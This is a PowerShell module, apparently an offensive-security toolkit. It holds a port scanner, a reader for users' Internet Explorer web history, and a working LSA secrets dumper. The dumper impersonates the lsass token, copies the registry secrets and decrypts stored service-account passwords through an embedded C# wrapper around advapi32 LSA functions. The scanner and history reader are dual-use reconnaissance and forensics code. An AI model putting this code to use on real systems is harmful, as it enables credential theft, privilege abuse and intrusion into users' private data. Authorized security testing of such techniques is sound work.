Function Start-PortScan {
	<#
		.SYNOPSIS
			Conducts a port scan on the selected computer.

		.DESCRIPTION
			Tries to connect to common ports on a targetted system and reports back the status of each.

		.PARAMETER ComputerName
			The name of the computer to scan. The parameter defaults to "localhost"

		.INPUTS
			System.String

				The input can be piped to Start-PortScan

		.OUTPUTS
			System.Management.Automation.PSCustomObject[]

				Each custom object has a property of Service, Port, and Status. Status is either Open or Closed.

		.EXAMPLE
			Start-PortScan -ComputerName remotecomputer.net

			Returns an array of open and closed ports on remotecomputer.net

		.NOTES
			AUTHOR: Michael Haken
			LAST UPDATE: 10/26/2017

		.FUNCTIONALITY
			The intended use of this cmdlet is to conduct a security scan of ports on a computer.

	#>
	[CmdletBinding()]
	[OutputType([System.Management.Automation.PSCustomObject[]])]
	Param(
		[Parameter(Position = 0, ValueFromPipeline = $true)]
		[ValidateNotNullOrEmpty()]
		[System.String]$ComputerName = "localhost"
	)
	
	Begin
	{
		$Ports = $script:Ports | Sort-Object -Property Port
	}

	Process
	{
        $Results = @()
        foreach ($Port in $Ports)
        {
            Write-Progress -Activity "Running Port Scan" -Status "Scanning Port $($Port.Port) $($Port.Service)" -PercentComplete (($i++ / $Ports.Count) * 100)
            $Result = Test-Port -Port $Port.Port -ComputerName $ComputerName
            $Results += ([PSCustomObject]@{"Service"="$($Port.Service)";"Port"=$($Port.Port);"Status"="$(if ($Result) {"Open"} else {"Closed"})"})
        }

        Write-Progress -Completed -Activity "Running Port Scan"

        Write-Output -InputObject $Results
	}

	End {	
	}
}

Function Get-LsaSecret {
	<#
		.SYNOPSIS
			Enumerates the content of the LSA Secrets registry hive.

		.DESCRIPTION
			The cmdlet first duplicates the lsass process token and sets it to the current process thread. Then it copies each secret stored in HKLM:\SECURITY\Policy\Secrets to a temporary location.
			After the content is copied over, Lsa functions from AdvApi32.dll are called to decrypt the content. When the cmdlet finishes, it leaves the registry area unchanged and reverts the process thread token.

            The CmdLet must be run with elevated permissions.

		.EXAMPLE
			Get-LsaSecret

			Retrieves all of the stored secrets in the registry using HKLM:\SECURITY\Policy\Secrets\<Generated GUID> to store the temporary information.

		.INPUTS
			None

		.OUTPUTS
            None

		.NOTES
			AUTHOR: Michael Haken
			LAST UPDATE: 10/23/2017
	#>

	[CmdletBinding()]
	[OutputType()]
	Param()

	Begin {
		if (!([System.Management.Automation.PSTypeName]"BAMCIS.PowerShell.OffensiveSecurity.LSAUtil").Type) {
			Add-Type -TypeDefinition $script:LsaSignature
		}
	}

	Process {
		Get-ProcessToken -ProcessName lsass | Set-ProcessToken	

		$TempKey = [System.Guid]::NewGuid().ToString()

		#Set up a temporary location to copy the registry keys over so that we can enumerate them, we have to be the owner to get the unencrypted values
		$Destination = "HKLM:\SECURITY\Policy\Secrets\$TempKey"

		if ((Get-Item -Path $Destination -ErrorAction SilentlyContinue) -ne $null) {
			Remove-Item -Path $Destination -Recurse -Force | Out-Null
		}

		New-Item -Path $Destination | Out-Null
		$Secrets = @()

		#Get all sub keys in secrets, these are the accounts
		Get-ChildItem -Path "HKLM:\SECURITY\Policy\Secrets" | Where-Object  {$_.Name -notmatch $TempKey -and $_.Property -ne $null} | ForEach-Object {
			$AccountName = $_.PSChildName
			
			#Get all the sub keys of the accounts, these are keys like CurrVal, OldVal, CupdTime, etc			
			Get-ChildItem -Path $_.PSPath | ForEach-Object {
				$ItemName = $_.PSChildName

				#If the sub key exists at the temp destination, delete it
				if ((Test-Path -Path "$Destination\$ItemName")) {
					Remove-Item -Path "$Destination\$ItemName" -Recurse -Force | Out-Null
				}

				#Copy the value over to the new registry location
				[System.Byte[]]$Property = Get-ItemProperty -Path $_.PSPath | Select-Object -ExpandProperty "(Default)"
				New-Item -Path "$Destination\$ItemName" | Out-Null
				Set-ItemProperty -Path "$Destination\$ItemName" -Name '(Default)' -Value $Property
			}

			$LsaUtil = New-Object -TypeName BAMCIS.PowerShell.OffensiveSecurity.LSAUtil -ArgumentList @($TempKey)

			try {
				$Value = $LsaUtil.GetSecret()
			}
			catch [Exception] {
				$Value = [System.String]::Empty
			}

			if ($AccountName -match "^_SC_") {
				# Get Service Account
				$Service = $AccountName -Replace "^_SC_"
				Try {
					# Get Service Account				
					$Account = Get-CimInstance -ClassName Win32_Service -Filter "Name = '$Service'" -Property StartName -ErrorAction Stop | Select-Object -ExpandProperty StartName
				}
				catch [Exception] {
					$Account = [System.String]::Empty
				}
			} else {
				$Account = [System.String]::Empty
			}

			$Hex = [System.Text.Encoding]::Unicode.GetBytes($Value) | ForEach-Object {
				Write-Output -InputObject $_.ToString("X2")
			}

			$EncryptedBinary = [System.Byte[]](Get-ItemProperty -Path "$Destination\CurrVal" -Name "(Default)" | Select-Object -ExpandProperty "(Default)")

			$Temp = Set-ItemProperty -Path "$Destination\CurrVal" -Name "(Default)" -Value (Get-ItemProperty -Path "$Destination\OldVal" -Name "(Default)" | Select-Object -ExpandProperty "(Default)") -PassThru

			try {
				$OldSecret = $LsaUtil.GetSecret()
			}
			catch [Exception] {
				$OldSecret = [System.String]::Empty
			}

			$Secrets += (New-Object -TypeName PSObject -Property @{Name = $AccountName; Secret = $Value; OldSecret = $OldSecret; SecretHex = ($Hex -join " "); Account = $Account; EncryptedBinary = $EncryptedBinary})  
		}

		Remove-Item -Path "$Destination" -Force -Recurse
		Reset-ProcessToken
		Write-Output -InputObject $Secrets
	}

	End {		
	}
}

Function Get-WebHistory {
	<#
		.SYNOPSIS
			Reads the Internet Explorer web history of a user from the WebCacheV01.dat file.

		.DESCRIPTION
			The Get-WebHistory cmdlet is a forensic tools that reads the actual web history of a given user. It uses the ESE database functions to read the WebCacheV01.dat file. This works in IE10+.

			It is recommended that you use a copy of the database and logs so that the original database is not modified.

		.EXAMPLE
			Get-WebHistory

			Gets the web history of all users on the local computer.

		.PARAMETER UserName
			The user name to get the web history for. This defaults to all users.

		.INPUTS
			System.String

		.OUTPUTS
			System.Management.Automation.PSObject[]

			The array of objects contain Url, AccessedTime, and UserName information

		.NOTES
			AUTHOR: Michael Haken
			LAST UPDATE: 10/25/2017
	#>
	[CmdletBinding()]
	[OutputType([System.Management.Automation.PSObject[]])]
	Param(
		[Parameter(Position = 0, ValueFromPipeline = $true)]
		[ValidateNotNullOrEmpty()]
		[System.String]$UserName = [System.String]::Empty
	)

	Begin {
		$Verbose = $PSBoundParameters.ContainsKey("Verbose").IsPresent
		Import-Module -Name BAMCIS.Logging
		Import-Module -Name BAMCIS.Common -ErrorAction Stop
		Import-Module -Name ESENT -ErrorAction Stop
	}

	Process {
		$Data = @()

		$Profiles = Get-UserProfiles
		if (![System.String]::IsNullOrEmpty($UserName)) {
			$Profiles = $Profiles | Where-Object {$_ -like "*$UserName*"}
		}

		foreach ($Profile in $Profiles) {			
			$Parts = $Profile.Split("\")
			$CurrentUser = $Parts[$Parts.Length - 1]
			$Path = Join-Path -Path $Profile -ChildPath "AppData\Local\Microsoft\Windows\WebCache"
			$Destination = "$env:USERPROFILE\AppData\Local\Temp"

			Write-Log -Message "Processing user $CurrentUser at path $Path" -Level VERBOSE

			if ((Test-Path -Path $Path) -and (Test-Path -Path "$Path\WebCacheV01.dat")) {
				Stop-Process -Name dllhost -Force -ErrorAction SilentlyContinue
				Stop-Process -Name taskhostw -Force -ErrorAction SilentlyContinue

				Write-Log -Message "Copying WebCache folder." -Level VERBOSE 

				Copy-Item -Path $Path -Destination $Destination -Recurse -Force

				Write-Log -Message "Finished copy." -Level VERBOSE

				$DB = $null
				$DB = Get-ESEDatabase -Path "$Destination\WebCache\WebCacheV01.dat" -LogPrefix "V01" -ProcessesToStop @("dllhost","taskhostw") -Recovery $false -CircularLogging $true -Force
				Remove-Item -Path "$Destination\WebCache" -Force -Recurse
				foreach ($Table in $DB) {
					if ($Table.Rows.Count -gt 0 -and (Get-Member -InputObject $Table.Rows[0] -Name "Url" -MemberType Properties) -ne $null) {
						$Data += ($Table.Rows | Select-Object -Property AccessedTime,Url,@{Name="UserName";Expression = {$CurrentUser}})
					}
				}
			}
		}

		Write-Output -InputObject $Data
	}

	End {
	}
}


$script:Ports = @(
	[PSCustomObject]@{"Service"="FTP Data";"Port"=20},
	[PSCustomObject]@{"Service"="FTP Command";"Port"=21},
	[PSCustomObject]@{"Service"="SSH";"Port"=22},
	[PSCustomObject]@{"Service"="TelNet";"Port"=23},
	[PSCustomObject]@{"Service"="SMTP";"Port"=25},
	[PSCustomObject]@{"Service"="WINS";"Port"=42},
	[PSCustomObject]@{"Service"="DNS";"Port"=53},
	[PSCustomObject]@{"Service"="DHCP Server";"Port"=67},
	[PSCustomObject]@{"Service"="DHCP Client";"Port"=68},
	[PSCustomObject]@{"Service"="TFTP";"Port"=69},
	[PSCustomObject]@{"Service"="HTTP";"Port"=80},
	[PSCustomObject]@{"Service"="Kerberos";"Port"=88},
	[PSCustomObject]@{"Service"="POP3";"Port"=110},
	[PSCustomObject]@{"Service"="SFTP";"Port"=115},
	[PSCustomObject]@{"Service"="NetBIOS Name Service";"Port"=137},
	[PSCustomObject]@{"Service"="NetBIOS Datagram Service";"Port"=138},
	[PSCustomObject]@{"Service"="NetBIOS Session Service";"Port"=139},
	[PSCustomObject]@{"Service"="SNMP";"Port"=161},
	[PSCustomObject]@{"Service"="LDAP";"Port"=389},
	[PSCustomObject]@{"Service"="SSL";"Port"=443},
	[PSCustomObject]@{"Service"="SMB";"Port"=445},
	[PSCustomObject]@{"Service"="Syslog";"Port"=514},
	[PSCustomObject]@{"Service"="RPC";"Port"=135},
	[PSCustomObject]@{"Service"="LDAPS";"Port"=636},
	[PSCustomObject]@{"Service"="SOCKS";"Port"=1080},
	[PSCustomObject]@{"Service"="MSSQL";"Port"=1433},
	[PSCustomObject]@{"Service"="SQL Browser";"Port"=1434},
	[PSCustomObject]@{"Service"="Oracle DB";"Port"=1521},
	[PSCustomObject]@{"Service"="NFS";"Port"=2049},
	[PSCustomObject]@{"Service"="RDP";"Port"=3389},
	[PSCustomObject]@{"Service"="XMPP";"Port"=5222},
	[PSCustomObject]@{"Service"="HTTP Proxy";"Port"=8080},
	[PSCustomObject]@{"Service"="Global Catalog";"Port"=3268},
	[PSCustomObject]@{"Service"="Global Catalog/SSL";"Port"=3269},
	[PSCustomObject]@{"Service"="POP3/SSL";"Port"=995},
	[PSCustomObject]@{"Service"="IMAP/SSL";"Port"=993},
	[PSCustomObject]@{"Service"="IMAP";"Port"=143}
)

$script:LsaSignature = @"
using System;
using System.Text;
using System.Runtime.InteropServices;
using System.ComponentModel;

namespace BAMCIS.PowerShell.OffensiveSecurity
{
    public class LSAUtil
    {

        [StructLayout(LayoutKind.Sequential)]
        private struct LSA_UNICODE_STRING
        {
            public UInt16 Length;
            public UInt16 MaximumLength;
            public IntPtr Buffer;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct LSA_OBJECT_ATTRIBUTES
        {
            public int Length;
            public IntPtr RootDirectory;
            public LSA_UNICODE_STRING ObjectName;
            public uint Attributes;
            public IntPtr SecurityDescriptor;
            public IntPtr SecurityQualityOfService;
        }

        private enum LSA_AccessPolicy : long
        {
            POLICY_VIEW_LOCAL_INFORMATION = 0x00000001L,
            POLICY_VIEW_AUDIT_INFORMATION = 0x00000002L,
            POLICY_GET_PRIVATE_INFORMATION = 0x00000004L,
            POLICY_TRUST_ADMIN = 0x00000008L,
            POLICY_CREATE_ACCOUNT = 0x00000010L,
            POLICY_CREATE_SECRET = 0x00000020L,
            POLICY_CREATE_PRIVILEGE = 0x00000040L,
            POLICY_SET_DEFAULT_QUOTA_LIMITS = 0x00000080L,
            POLICY_SET_AUDIT_REQUIREMENTS = 0x00000100L,
            POLICY_AUDIT_LOG_ADMIN = 0x00000200L,
            POLICY_SERVER_ADMIN = 0x00000400L,
            POLICY_LOOKUP_NAMES = 0x00000800L,
            POLICY_NOTIFICATION = 0x00001000L
        }

        [DllImport("advapi32.dll", SetLastError = true, PreserveSig = true)]
        private static extern uint LsaRetrievePrivateData(
            IntPtr PolicyHandle,
            ref LSA_UNICODE_STRING KeyName,
            out IntPtr PrivateData
        );

        [DllImport("advapi32.dll", SetLastError = true, PreserveSig = true)]
        private static extern uint LsaStorePrivateData(
             IntPtr policyHandle,
             ref LSA_UNICODE_STRING KeyName,
             ref LSA_UNICODE_STRING PrivateData
        );

        [DllImport("advapi32.dll", SetLastError = true, PreserveSig = true)]
        private static extern uint LsaOpenPolicy(
            ref LSA_UNICODE_STRING SystemName,
            ref LSA_OBJECT_ATTRIBUTES ObjectAttributes,
            uint DesiredAccess,
            out IntPtr PolicyHandle
        );

        [DllImport("advapi32.dll", SetLastError = true, PreserveSig = true)]
        private static extern uint LsaNtStatusToWinError(
            uint status
        );

        [DllImport("advapi32.dll", SetLastError = true, PreserveSig = true)]
        private static extern uint LsaClose(
            IntPtr policyHandle
        );

        [DllImport("advapi32.dll", SetLastError = true, PreserveSig = true)]
        private static extern uint LsaFreeMemory(
            IntPtr buffer
        );

        private LSA_OBJECT_ATTRIBUTES ObjectAttributes;
        private LSA_UNICODE_STRING LocalSystem;
        private LSA_UNICODE_STRING SecretName;

        public LSAUtil(string Key)
        {
            if (Key.Length == 0)
            {
                throw new ArgumentException("Key length zero");
            }

            this.ObjectAttributes = new LSA_OBJECT_ATTRIBUTES();
            this.ObjectAttributes.Length = 0;
            this.ObjectAttributes.RootDirectory = IntPtr.Zero;
            this.ObjectAttributes.Attributes = 0;
            this.ObjectAttributes.SecurityDescriptor = IntPtr.Zero;
            this.ObjectAttributes.SecurityQualityOfService = IntPtr.Zero;

            this.LocalSystem = new LSA_UNICODE_STRING();
            this.LocalSystem.Buffer = IntPtr.Zero;
            this.LocalSystem.Length = 0;
            this.LocalSystem.MaximumLength = 0;

            this.SecretName = new LSA_UNICODE_STRING();
            this.SecretName.Buffer = Marshal.StringToHGlobalUni(Key);
            this.SecretName.Length = (UInt16)(Key.Length * UnicodeEncoding.CharSize);
            this.SecretName.MaximumLength = (UInt16)((Key.Length + 1) * UnicodeEncoding.CharSize);
        }

        private IntPtr GetLsaPolicy(LSA_AccessPolicy Access)
        {
            IntPtr LsaPolicyHandle;

            uint NtsResult = LsaOpenPolicy(ref this.LocalSystem, ref this.ObjectAttributes, (uint)Access, out LsaPolicyHandle);

            uint WinErrorCode = LsaNtStatusToWinError(NtsResult);
            if (WinErrorCode != 0)
            {
                throw new Win32Exception(Convert.ToInt32(WinErrorCode));
            }

            return LsaPolicyHandle;
        }

        private static void ReleaseLsaPolicy(IntPtr LsaPolicyHandle)
        {
            uint NtsResult = LsaClose(LsaPolicyHandle);
            uint WinErrorCode = LsaNtStatusToWinError(NtsResult);

            if (WinErrorCode != 0)
            {
                throw new Win32Exception(Convert.ToInt32(WinErrorCode));
            }
        }

        private static void FreeMemory(IntPtr Buffer)
        {
            uint NtsResult = LsaFreeMemory(Buffer);
            uint WinErrorCode = LsaNtStatusToWinError(NtsResult);
            if (WinErrorCode != 0)
            {
                throw new Win32Exception(Convert.ToInt32(WinErrorCode));
            }
        }

        public void SetSecret(string Value)
        {
            LSA_UNICODE_STRING LusSecretData = new LSA_UNICODE_STRING();

            if (Value.Length > 0)
            {
                //Create data and key
                LusSecretData.Buffer = Marshal.StringToHGlobalUni(Value);
                LusSecretData.Length = (UInt16)(Value.Length * UnicodeEncoding.CharSize);
                LusSecretData.MaximumLength = (UInt16)((Value.Length + 1) * UnicodeEncoding.CharSize);
            }
            else
            {
                //Delete data and key
                LusSecretData.Buffer = IntPtr.Zero;
                LusSecretData.Length = 0;
                LusSecretData.MaximumLength = 0;
            }

            IntPtr LsaPolicyHandle = GetLsaPolicy(LSA_AccessPolicy.POLICY_CREATE_SECRET);
            uint Result = LsaStorePrivateData(LsaPolicyHandle, ref this.SecretName, ref LusSecretData);
            LSAUtil.ReleaseLsaPolicy(LsaPolicyHandle);

            uint WinErrorCode = LsaNtStatusToWinError(Result);
            if (WinErrorCode != 0)
            {
                throw new Win32Exception(Convert.ToInt32(WinErrorCode));
            }
        }

        public string GetSecret()
        {
            IntPtr PrivateData = IntPtr.Zero;

            IntPtr LsaPolicyHandle = GetLsaPolicy(LSA_AccessPolicy.POLICY_GET_PRIVATE_INFORMATION);
            uint NtsResult = LsaRetrievePrivateData(LsaPolicyHandle, ref this.SecretName, out PrivateData);
            LSAUtil.ReleaseLsaPolicy(LsaPolicyHandle);

            uint WinErrorCode = LsaNtStatusToWinError(NtsResult);

            if (WinErrorCode != 0)
            {
                throw new Win32Exception(Convert.ToInt32(WinErrorCode));
            }

            LSA_UNICODE_STRING LusSecretData = (LSA_UNICODE_STRING)Marshal.PtrToStructure(PrivateData, typeof(LSA_UNICODE_STRING));
            string Value = Marshal.PtrToStringAuto(LusSecretData.Buffer).Substring(0, LusSecretData.Length / 2);

            LSAUtil.FreeMemory(PrivateData);

            return Value;
        }
    }
}
"@